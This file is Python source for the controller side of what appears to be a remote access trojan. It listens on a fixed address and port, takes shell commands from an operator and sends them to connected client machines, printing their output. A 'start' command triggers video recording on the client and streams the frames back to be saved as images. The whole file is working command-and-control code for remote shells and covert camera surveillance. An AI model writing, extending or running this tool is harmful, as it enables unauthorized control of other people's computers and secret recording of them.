import socket
import threading
import os

SERVER_HOST = "169.254.193.170"
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, adjustable
SEPARATOR = "<sep>"

# Create a server socket
s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening on {SERVER_HOST}:{SERVER_PORT}...")

# Function to handle client connections
def handle_client(client_socket, client_address):
    print(f"[+] {client_address} connected.")

    # Receive the current working directory and OS of the client
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    client_os = client_socket.recv(BUFFER_SIZE).decode()
    print(f"Client OS: {client_os}")
    print(f"Client working directory: {cwd}")

    while True:
        # Get the command to execute from the server user
        command = input(f"{client_address}@{cwd} > ")
        if command.lower() == "exit":
            client_socket.send(command.encode())  # Send 'exit' to close client connection
            break
        elif command.lower() == "start":
            client_socket.send(command.encode())  # Send 'start' to start video recording
            print("Waiting for the video stream...")

            # Start receiving video frames
            try:
                while True:
                    # Receive the frame size first
                    frame_size_data = client_socket.recv(4)
                    if not frame_size_data:
                        print("Client disconnected.")
                        break
                    frame_size = int.from_bytes(frame_size_data, byteorder='little')

                    # Receive the frame bytes
                    frame_data = b""
                    while len(frame_data) < frame_size:
                        packet = client_socket.recv(frame_size - len(frame_data))
                        if not packet:
                            print("Connection lost.")
                            return
                        frame_data += packet

                    # Save received frame as image file
                    with open('received_frame.jpg', 'wb') as f:
                        f.write(frame_data)

                    print("Received and saved a frame.")
            except Exception as e:
                print(f"Error receiving video stream: {e}")
                break
        else:
            # Send the command to the client
            client_socket.send(command.encode())
            # Receive the result of the command execution
            output = client_socket.recv(BUFFER_SIZE).decode()
            results, cwd = output.split(SEPARATOR)
            print(results)

    client_socket.close()

# Accept and handle multiple clients
while True:
    client_socket, client_address = s.accept()
    client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
    client_handler.start()

s.close()
